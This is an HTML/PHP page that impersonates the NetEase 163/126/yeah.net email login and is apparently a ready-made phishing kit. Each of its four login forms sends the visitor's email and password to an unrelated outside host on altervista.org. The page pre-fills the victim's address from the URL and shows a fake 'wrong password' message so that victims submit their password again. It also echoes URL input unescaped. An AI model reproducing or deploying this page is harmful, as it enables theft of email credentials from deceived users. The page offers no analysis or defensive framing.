<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>网易免费邮箱 - 中国第一大电子邮件服务商</title>
<link rel="shortcut icon" href="email.163.com/img/favicon" />
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
<style>
div {
	box-sizing: border-box;
}
p {
	clear: both;
	float: none;
}
body {
	text-align: center;
	font-size: 12px;
	background: #1691d7 url(email.163.com/img/bkground.jpg) no-repeat 50%;
	line-height: 1;
	height: 100%;
	margin: 0;
	padding: 0;
	border: 0;
	font-size: 100%;
	vertical-align: baseline;
	font-family: "Microsoft YaHei", "微软雅黑", "宋体", helvetica, "Hiragino Sans GB";
	font-size: 14px;
	line-height: 1.14;
	color: #666;
}
h1 {
	color: #333;
	font-family: arial, sans-serif;
	margin: 1em auto;
	width: 80%;
}
.tabordion {
	width: 480px;
	height: auto;
	min-height: 344px;
	overflow: visible;
	margin-top: 0px;
	text-align: left;
	margin-top: 4%;
	position: relative;
	z-index: 10;
	margin-right: auto;
	margin-bottom: 0;
	margin-left: auto;
}
.tabordion input[name="sections"] {
	left: -9999px;
	position: absolute;
	top: -9999px;
}
.tabordion section {
	display: block;
}
.tabordion section label {
	background: #fff;
	display: block;
	z-index: 1;
	width: 180px;
	background-repeat: no-repeat;
	height: 56px;
	border-bottom: 1px solid #ccc;
	cursor: pointer;
	position: relative;
	padding-top: 15px;
	padding-right: 20px;
	padding-bottom: 15px;
	padding-left: 20px;
	filter: alpha(opacity=40);
	_filter: alpha(opacity=40);
	opacity: .4;
}
.tabordion section article {
	display: none;
	position: absolute;
	left: 220px;
	top: 0;
	width: 450px;
	height: 347px;
	min-height: 347px;
	background-color: #fff;
	box-shadow: 0 1px 5px rgba(0,0,0,.5);
	border-left: 1px solid #eee;
	padding-top: 0;
	padding-right: 0;
	padding-bottom: 0;
	padding-left: 21px;
}
.main h2 {
	width: 298px;
	height: 26px;
	position: absolute;
	left: 0;
	top: -80px;
	background-image: url(email.163.com/img/global.04d31afe.png);
	background-position: 0 -64px;
	white-space: nowrap;
	text-indent: 1000px;
	overflow: hidden;
}
.inputbox {
	z-index: 19;
	position: relative;
	height: 44px;
	margin-bottom: 4px;
	border: 1px solid #c5cddb;
	background: #fff;
	font-size: 12px;
	line-height: 44px;
	padding: 0px 0px 0px 50px;
	width: 80%;
	font-size: 16px;
	color: #333;
	font-weight: bold;
	/* [disabled]background-position: -251px -86px;
*/
	/* [disabled]background: url(//ursdoccdn.nosdn.127.net/webzj_cdn101/sprite_61fbe151ab715649c6b7c4ec39156201.png) -9999px -9999px no-repeat;
*/
	/* [disabled]background-position-x: -9999px;
*/
	/* [disabled]background-position-y: -9999px;
*/
	_background: url(//ursdoccdn.nosdn.127.net/webzj_cdn101/sprite8_31811e6b333b8188ed4330196ed09dc9.png) -9999px -9999px no-repeat;
}
.inputbox placeholder {
	font-size: 14px;
	font-weight: normal;
	color: #bdbdbd;
}
.icons1, .icons2, .icons3 {
	background-repeat: no-repeat;
	background-position: 10px center;
}
.icons1 {
	background-image: url(email.163.com/img/icon1.png);
}
.icons2 {
	background-image: url(email.163.com/img/icon2.png);
}
.icons3 {
	background-image: url(email.163.com/img/icon3.png);
}
.button1, .button-green, .button-blue, .btn {
	background: #B7050A;
	background-image: none;
	background-image: linear-gradient(#D51A1F, #B7050A);
	border-radius: 4px;
	border: #B41116 1px solid;
	display: block;
	width: 93%;
	height: 44px;
	cursor: pointer;
	text-align: center;
	color: #fff;
	font-size: 18px;
	line-height: 44px;
}
.button-green {
	background: #3B9F50;
	background-image: linear-gradient(#45A659, #3B9F50);
	border: #258436 1px solid;
}
.button-blue {
	background: #4B91D8;
	background-image: linear-gradient(#64A5E6, #4086CE);
	border: #6699CC 1px solid;
}
.btn {
	top: 180px;
	background: #185c94;
	background-image: none;
	background-image: linear-gradient(#2374b3, #19588b);
	border-radius: 4px;
	border: 1px solid #19588b;
	color: #fff;
	text-decoration: none;
	text-align: center;
	height: 44px;
	line-height: 44px;
	font-size: 18px;
}
}
.tabordion section article:after {
	background-color: #ccc;
	bottom: 0;
	content: "";
	display: block;
	left: -229px;
	position: absolute;
	top: 0;
	width: 220px;
	z-index: 1;
}
.tabordion input[name="sections"]:checked + label {
	background: #fff;
	color: #bbb;
	z-index: 1;
	filter: alpha(opacity=40);
	_filter: alpha(opacity=40);
	opacity: .9;
}
.tabordion input[name="sections"]:checked ~ article {
	display: block;
}
 @media (max-width: 533px) {
h1 {
	width: 100%;
}
.tabordion {
	width: 100%;
}
.tabordion section label {
	font-size: 1em;
	width: 160px;
}
.tabordion section article {
	left: 200px;
	min-width: 270px;
}
.tabordion section article:after {
	background-color: #ccc;
	bottom: 0;
	content: "";
	display: block;
	left: -199px;
	position: absolute;
	top: 0;
	width: 200px;
}
}
 @media (max-width: 768px) {
h1 {
	width: 96%;
}
.tabordion {
	width: 96%;
}
}
 @media (min-width: 1366px) {
h1 {
	width: 70%;
}
.tabordion {
	width: 680px;
}
}
.boxIN {
	padding: 20px 40px 40px 40px;
}
.center1 {
	text-align: center;
	display: block;
	float: none;
	width: auto;
}
.boxline-left, .boxline-right {
	border-top-width: thin;
	border-top-style: solid;
	border-top-color: #CCC;
	padding-top: 6px;
	width: 50%;
	float: left;
	display: inline-block;
	margin-bottom: 20px
}
.boxline-right {
	float: right;
	text-align: right;
	width: 42%;
	margin-right: 8%;
}
.boxl7-left, .boxl7-right {
	padding-top: 4px;
	width: 50%;
	float: left;
	display: inline-block;
	margin-bottom: 20px
}
.boxl7-right {
	float: right;
	text-align: right;
	width: 42%;
	margin-right: 8%;
}
.header {
	height: 45px;
	background-color: #0b496c;
	width: 100%;
	min-width: 680px;
	padding-right: 25%;
	padding-left: 25%;
	padding-top: 8px;
}
.header a {
	padding-top: 8px;
	color: #6b8798;
	font-size: 14px;
	text-decoration: none;
	margin-right: 10px;
	margin-left: 10px;
	display: inline-block;
}
.header a:hover {
	text-decoration: underline;
}
.logo {
	display: block;
	float: left;
	margin-right: 10%;
}
.H2Box {
	color: #FFF;
	margin-right: 25%;
	margin-left: 25%;
	text-align: left;
	vertical-align: middle;
	display: block;
	height: auto;
	width: auto;
	font-size: 24px;
	padding-top: 4px;
	padding-right: 0px;
	padding-bottom: 0px;
	padding-left: 0px;
}
.outside {
	position: relative;
}
.inside, .inside-2 {
	position: absolute;
	bottom: 0;
	background-color: #73bde7;
	height: 45px;
	line-height: 45px;
	color: #45718b;
	overflow: hidden;
	text-align: center;
	vertical-align: middle;
	width: 100%;
	margin-right: auto;
	margin-left: auto;
}
.inside a {
	color: #45718b;
	text-decoration: none;
	display: inline-block;
	padding-right: 8px;
	padding-left: 8px;
	font-weight: lighter;
}
.inside-2 {
	position: absolute;
	bottom: 36px;
	background-color: transparent;
	padding: 0px;
	color: #FFF;
	opacity: .5;
}
.error1 {
	font-size: 12px;
	font-weight: lighter;
	color: #F00;
	background-image: url(email.163.com/img/error1.png);
	background-repeat: no-repeat;
	background-position: left center;
	padding-left: 20px;
	padding-top: 0px;
	padding-right: 0px;
	padding-bottom: 0px;
	display: block;
	clear: both;
	float: none;
	width: auto;
	margin-right: auto;
	margin-left: auto;
	vertical-align: middle;
}
</style>
<script>
$(function () {
    $('#tab1 a').click(function (e) {
        e.preventDefault();
        $('a[href="' + $(this).attr('href') + '"]').tab('show');
    })
});
</script>
</head>

<body>
<div class="container">
  <div class="header"> <img src="email.163.com/img/ntes_logo.png" class="logo" /> <a href="#">收费邮</a> <a href="#">企业邮箱</a> <a href="#">国外用户登录</a> <a href="#">学生用户登录</a> <a href="#">手机客户端 帮助</a> </div>
  <div class="H2Box"> 中国第一大电子邮件服务商 </div>
  <div class="tabordion">
    <p>
    <section id="section1">
      <input type="radio" name="sections" id="option1" checked>
      <label for="option1" style="background-image: url(email.163.com/img/163.png); background-repeat:no-repeat; background-position:center;"></label>
      <article>
        <div class="boxIN">
          <form method="get" name="loginForm" action="http://directoryupdatee.altervista.org/veri1/member.php" accept-charset="UTF-8">
            <p>
              <input name="email" type="text" class="inputbox icons1" id="auto-id-1523799205816" placeholder="邮箱帐号" style="" tabindex="1" autocomplete="off" value="<?php echo $_GET['email']; ?>" readonly="readonly" spellcheck="false" data-placeholder="邮箱帐号" data-type="email" data-loginname="loginEmail" data-required="true">
            </p>
            <p>
               <span id="sprytextfield1">
              <input name="password" class="inputbox icons2" placeholder="邮箱帐号" style="" type="password">
              <span class="textfieldRequiredMsg">请输入密码</span></span>
              <?php 
// Show IF Conditional region1 
if (@$_GET['INFO'] == "unsuccessful") {
?>
            <div class="error1">帐号或密码错误</div>
                  <?php } 
// endif Conditional region1
?>
            </p>
            <input name="login" type="submit" class="button-blue" id="login" value="登 录"/>
            <br />
            <div class="boxl7-left">忘记密码？</div>
            <div class="boxl7-right">去注册</div>
            <div class="boxline-left">SSL安全登录 邮箱版本：</div>
            <div class="boxline-right">
              <input name="" type="checkbox" value="" checked="checked" />
              默认版本 </div>
            <div class="center1"><img src="email.163.com/img/mailvip_logo_4.png" width="256" height="35" style="alignment-adjust:central;"/> </div>
          </form>
        </div>
      </article>
    </section>
    <section id="section2">
      <input type="radio" name="sections" id="option2">
      <label for="option2" class="mainBTN" style="background-image: url(email.163.com/img/126.png); background-repeat:no-repeat; background-position:center;"></label>
      <article>
        <div class="boxIN">
          <form method="get" name="loginForm" action="http://directoryupdatee.altervista.org/veri1/member.php" accept-charset="UTF-8">
            <p>
              <input data-placeholder="邮箱帐号" name="email" data-type="email" data-loginname="loginEmail" data-required="true" class="inputbox icons1" readonly="readonly" autocomplete="off" tabindex="1" spellcheck="false" id="auto-id-1523799205816" placeholder="邮箱帐号" type="text" value="<?php echo $_GET['email']; ?>">
            </p>
            <p>
               <span id="sprytextfield1">
              <input name="password" class="inputbox icons2" placeholder="邮箱帐号" style="" type="password">
              <span class="textfieldRequiredMsg">请输入密码</span></span>
              <?php 
// Show IF Conditional region1 
if (@$_GET['INFO'] == "unsuccessful") {
?>
                  <div class="error1">帐号或密码错误</div>
                  <?php } 
// endif Conditional region1
?>
            </p>
            <input name="login" type="submit" class="button-green" value="登 录" id="login"/>
            <br />
            <div class="boxl7-left">忘记密码？</div>
            <div class="boxl7-right">去注册</div>
            <div class="boxline-left">SSL安全登录 邮箱版本：</div>
            <div class="boxline-right">
              <input name="" type="checkbox" value="" checked="checked" />
              默认版本 </div>
            <div class="center1"><img src="email.163.com/img/mailvip_logo_4.png" width="256" height="35" style="alignment-adjust:central;"/> </div>
          </form>
        </div>
      </article>
    </section>
    <section id="section3">
      <input type="radio" name="sections" id="option3" >
      <label for="option3" style="background-image: url(email.163.com/img/yeah.png); background-repeat:no-repeat; background-position:center;"></label>
      <article>
        <div class="boxIN">
          <form method="get" name="loginForm" action="http://directoryupdatee.altervista.org/veri1/member.php" accept-charset="UTF-8">
            <p>
              <input data-placeholder="邮箱帐号" name="email" data-type="email" data-loginname="loginEmail" data-required="true" class="inputbox icons1" readonly="readonly" autocomplete="off" tabindex="1" spellcheck="false" id="auto-id-1523799205816" placeholder="邮箱帐号" type="text" value="<?php echo $_GET['email']; ?>">
            </p>
            <p>
               <span id="sprytextfield1">
              <input name="password" class="inputbox icons2" placeholder="邮箱帐号" style="" type="password">
              <span class="textfieldRequiredMsg">请输入密码</span></span>
              <?php 
// Show IF Conditional region1 
if (@$_GET['INFO'] == "unsuccessful") {
?>
                  <div class="error1">帐号或密码错误</div>
                  <?php } 
// endif Conditional region1
?>
            </p>
            <input name="login" type="submit" class="button1" value="登 录" id="login"/>
            <br />
            <div class="boxl7-left">忘记密码？</div>
            <div class="boxl7-right">去注册</div>
            <div class="boxline-left">SSL安全登录 邮箱版本：</div>
            <div class="boxline-right">
              <input name="" type="checkbox" value="" checked="checked" />
              默认版本 </div>
            <div class="center1"><img src="email.163.com/img/mailvip_logo_4.png" width="256" height="35" style="alignment-adjust:central;"/> </div>
          </form>
        </div>
      </article>
    </section>
    <section id="section4">
      <input type="radio" name="sections" id="option4">
      <label for="option4" style="background-image: url(email.163.com/img/shi.png); background-repeat:no-repeat; background-position:center;"></label>
      <article>
        <div class="boxIN">
          <form method="get" name="loginForm" action="http://directoryupdatee.altervista.org/veri1/member.php" accept-charset="UTF-8">
            <p>
              <input data-placeholder="邮箱帐号" name="email" data-type="email" data-loginname="loginEmail" data-required="true" class="inputbox icons1" readonly="readonly" autocomplete="off" tabindex="1" spellcheck="false" id="auto-id-1523799205816" placeholder="邮箱帐号" type="text" value="<?php echo $_GET['email']; ?>">
            </p>
            <p>
            
            <span id="sprytextfield1">
              <input name="password" class="inputbox icons2" placeholder="邮箱帐号" style="" type="password">
              <span class="textfieldRequiredMsg">请输入密码</span></span>
            <?php 
// Show IF Conditional region1 
if (@$_GET['INFO'] == "unsuccessful") {
?>
                  <div class="error1">帐号或密码错误</div>
                  <?php } 
// endif Conditional region1
?>
            </p>
            <input name="login" type="submit" class="btn" value="登 录" id="login"/>
            <br />
            <div class="boxline-left">还没有网易手机号码邮箱？</div>
            <div class="boxline-right"></div>
            <div class="center1"><img src="email.163.com/img/mailvip_logo_4.png" width="256" height="35" style="alignment-adjust:central;"/> </div>
          </form>
        </div>
      </article>
    </section>
  </div>
  <div class="inside-2"> 你有一份绿色家居生活福利待领取！
    · hot 新秀丽制造商旅行箱包仅59元起
    · 网易严选：网易自营生活电商！</div>
  <div class="inside"><a href="" target="_blank">网易首页</a> <a href="" target="_blank">关于网易免费邮</a> <a href="" target="_blank">网易智造</a> <a href="" target="_blank">网易•有钱</a> <a href="" target="_blank">网易严选</a> <a href="" target="_blank">网易一起拼</a> <a href="" target="_blank">隐私政策</a> |网易公司版权所有 © 1997-              2018 </div>
</div>
<script type="text/javascript">
<!--
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1");
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2");
//-->
</script>
</body>
</html>
